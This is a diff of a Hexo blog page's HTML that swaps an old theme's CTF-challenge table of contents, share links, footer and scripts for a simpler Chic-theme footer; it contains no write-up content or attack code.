Basic]flask?jwt?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF-2020-CheckIN"><span class="toc-number">17.</span> <span class="toc-text">[GKCTF 2020]CheckIN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF-2018-Easy-Audit"><span class="toc-number">18.</span> <span class="toc-text">[NCTF 2018]Easy_Audit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-1-Basic-basic-check"><span class="toc-number">19.</span> <span class="toc-text">[NSSRound#1 Basic]basic_check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GDOUCTF-2023-hate-eat-snake"><span class="toc-number">20.</span> <span class="toc-text">[GDOUCTF 2023]hate eat snake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF-2018-Flask-PLUS"><span class="toc-number">21.</span> <span class="toc-text">[NCTF 2018]Flask PLUS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-level-up"><span class="toc-number">22.</span> <span class="toc-text">[NISACTF 2022]level-up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Calculate"><span class="toc-number">23.</span> <span class="toc-text">[HUBUCTF 2022 新生赛]Calculate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-CanCanNeed"><span class="toc-number">24.</span> <span class="toc-text">[FSCTF 2023]CanCanNeed</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B9%96%E6%B9%98%E6%9D%AF-2021-final-Penetratable"><span class="toc-number">25.</span> <span class="toc-text">[湖湘杯 2021 final]Penetratable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2022-%E5%88%9D%E8%B5%9B-ezpop"><span class="toc-number">26.</span> <span class="toc-text">[CISCN 2022 初赛]ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSCTF-2022-Spring-Recruit-babysql"><span class="toc-number">27.</span> <span class="toc-text">[NSSCTF 2022 Spring Recruit]babysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HDCTF-2023-YamiYami"><span class="toc-number">28.</span> <span class="toc-text">[HDCTF 2023]YamiYami</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyunser"><span class="toc-number">29.</span> <span class="toc-text">[SWPUCTF 2021 新生赛]babyunser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK3-ssssti"><span class="toc-number">30.</span> <span class="toc-text">[HNCTF 2022 WEEK3]ssssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GFCTF-2021-Baby-Web"><span class="toc-number">31.</span> <span class="toc-text">[GFCTF 2021]Baby_Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyphp"><span class="toc-number">32.</span> <span class="toc-text">[羊城杯 2020]easyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SCTF-2021-loginme"><span class="toc-number">33.</span> <span class="toc-text">[SCTF 2021]loginme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96"><span class="toc-number">34.</span> <span class="toc-text">[GWCTF 2019]枯燥的抽奖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce-3"><span class="toc-number">35.</span> <span class="toc-text">[SWPUCTF 2021 新生赛]hardrce_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B9%BF%E4%B8%9C%E5%BC%BA%E7%BD%91%E6%9D%AF-2021-%E5%9B%A2%E9%98%9F%E7%BB%84-love-Pokemon"><span class="toc-number">36.</span> <span class="toc-text">[广东强网杯 2021 团队组]love_Pokemon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2022-Node-Magical-Login"><span class="toc-number">37.</span> <span class="toc-text">[西湖论剑 2022]Node Magical Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2022-real-ez-node"><span class="toc-number">38.</span> <span class="toc-text">[西湖论剑 2022]real_ez_node</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ezpop"><span class="toc-number">39.</span> <span class="toc-text">[UUCTF 2022 新生赛]ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LitCTF-2023-Http-pro-max-plus"><span class="toc-number">40.</span> <span class="toc-text">[LitCTF 2023]Http pro max plus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AFCTF-2021-BABY-CSP"><span class="toc-number">41.</span> <span class="toc-text">[AFCTF 2021]BABY_CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp"><span class="toc-number">42.</span> <span class="toc-text">[极客大挑战 2020]greatphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-1-Basic-sql-by-sql"><span class="toc-number">43.</span> <span class="toc-text">[NSSRound#1 Basic]sql_by_sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GFCTF-2021-ez-calc"><span class="toc-number">44.</span> <span class="toc-text">[GFCTF 2021]ez_calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8C%97Day1-Web1"><span class="toc-number">45.</span> <span class="toc-text">[CISCN 2019华北Day1]Web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2021-%E5%9C%B0%E7%8B%B1%E9%80%9A%E8%AE%AF"><span class="toc-number">46.</span> <span class="toc-text">[MoeCTF 2021]地狱通讯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8C%97Day1-Web2"><span class="toc-number">47.</span> <span class="toc-text">[CISCN 2019华北Day1]Web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Power"><span class="toc-number">48.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]Power!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ISITDTU-2019-EasyPHP"><span class="toc-number">49.</span> <span class="toc-text">[ISITDTU 2019]EasyPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-number">50.</span> <span class="toc-text">[安洵杯 2019]easy_serialize_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-number">51.</span> <span class="toc-text">[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2020-Cookie-is-so-subtle"><span class="toc-number">52.</span> <span class="toc-text">[BJDCTF 2020]Cookie is so subtle!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-8-Basic-Upload-gogoggo"><span class="toc-number">53.</span> <span class="toc-text">[NSSRound#8 Basic]Upload_gogoggo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2021-fake-game"><span class="toc-number">54.</span> <span class="toc-text">[MoeCTF 2021]fake game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-13-Basic-ez-factors"><span class="toc-number">55.</span> <span class="toc-text">[NSSRound#13 Basic]ez_factors</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-4-SWPU-1zweb-revenge"><span class="toc-number">56.</span> <span class="toc-text">[NSSRound#4 SWPU]1zweb(revenge)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web4"><span class="toc-number">57.</span> <span class="toc-text">[CISCN 2019华东南]Web4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-number">58.</span> <span class="toc-text">[强网杯 2019]高明的黑客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prize-p2"><span class="toc-number">59.</span> <span class="toc-text">prize_p2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSCTF-2nd-MyHurricane"><span class="toc-number">60.</span> <span class="toc-text">[NSSCTF 2nd]MyHurricane</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-EasyCleanup"><span class="toc-number">61.</span> <span class="toc-text">[第五空间 2021]EasyCleanup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HZNUCTF-2023-final-eznode"><span class="toc-number">62.</span> <span class="toc-text">[HZNUCTF 2023 final]eznode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-EasyP"><span class="toc-number">63.</span> <span class="toc-text">[鹤城杯 2021]EasyP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-%E7%AD%BE%E5%88%B0plus"><span class="toc-number">64.</span> <span class="toc-text">[FSCTF 2023]签到plus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2022-%E5%88%9D%E8%B5%9B-online-crt"><span class="toc-number">65.</span> <span class="toc-text">[CISCN 2022 初赛]online_crt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-PNG%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E5%99%A8"><span class="toc-number">66.</span> <span class="toc-text">[第五空间 2021]PNG图片转换器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GHCTF-2024-%E6%96%B0%E7%94%9F%E8%B5%9B-ezzz-unserialize"><span class="toc-number">67.</span> <span class="toc-text">[GHCTF 2024 新生赛]ezzz_unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-4-SWPU-ez-rce"><span class="toc-number">68.</span> <span class="toc-text">[NSSRound#4 SWPU]ez_rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-number">69.</span> <span class="toc-text">[ASIS 2019]Unicorn shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-17-Basic-%E7%9C%9F%C2%B7%E7%AD%BE%E5%88%B0"><span class="toc-number">70.</span> <span class="toc-text">[NSSRound#17 Basic]真·签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-16-Basic-%E4%BA%86%E8%A7%A3%E8%BF%87PHP%E7%89%B9%E6%80%A7%E5%90%97"><span class="toc-number">71.</span> <span class="toc-text">[NSSRound#16 Basic]了解过PHP特性吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPU-2016-web400"><span class="toc-number">72.</span> <span class="toc-text">[SWPU 2016]web400</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#De1ctf-2019-SSRF-Me"><span class="toc-number">73.</span> <span class="toc-text">[De1ctf 2019]SSRF Me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prize-p4"><span class="toc-number">74.</span> <span class="toc-text">prize_p4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF-2020-ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode"><span class="toc-number">75.</span> <span class="toc-text">[GKCTF 2020]ez三剑客-easynode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-V-Team-PYRCE"><span class="toc-number">76.</span> <span class="toc-text">[NSSRound#V Team]PYRCE</span></a></li></ol>
-      </div>
-    
 
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&text=NSS-web刷题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-web刷题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&is_video=false&description=NSS-web刷题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=NSS-web刷题&body=Check out this article: http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-web刷题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-web刷题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-web刷题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-web刷题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&name=NSS-web刷题&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&t=NSS-web刷题"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+    </article>
 </div>
 
-        
-        
-<footer id="footer">
-    <div class="footer-left">
-        Copyright ©
-        
-        
-        2024-2026
-        Meteor_Kai
-        <br>
-        <a href="https://www.dkdun.cn/" target="_blank">DK盾</a>
-    </div>
-    
-    <div class="footer-right">
-        <nav>
-            <ul>
-                <!--
-                --><li><a href="/">Home</a></li><!--
-                --><!--
-                --><li><a href="/about/">About me</a></li><!--
-                --><!--
-                --><li><a href="/archives/">Writing</a></li><!--
-                --><!--
-                --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
-                --><!--
-                --><li><a href="/search/">Search</a></li><!--
-                --><!--
-                --><li><a href="/categories/">categories</a></li><!--
-                --><!--
-                --><li><a href="/tags/">tags</a></li><!--
-                --><!--
-                --><li><a href="/links/">links</a></li><!--
-                -->
-            </ul>
-            <ul>
-                
-                <!-- 不蒜子统计 -->
-                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
-                <span class="post-meta-divider">|</span>
-                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
-                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-                
-            </ul>
-        </nav>
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Meteor_Kai | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
     </div>
 </footer>
 
-
     </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
-
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
-
 </body>
+
 </html>
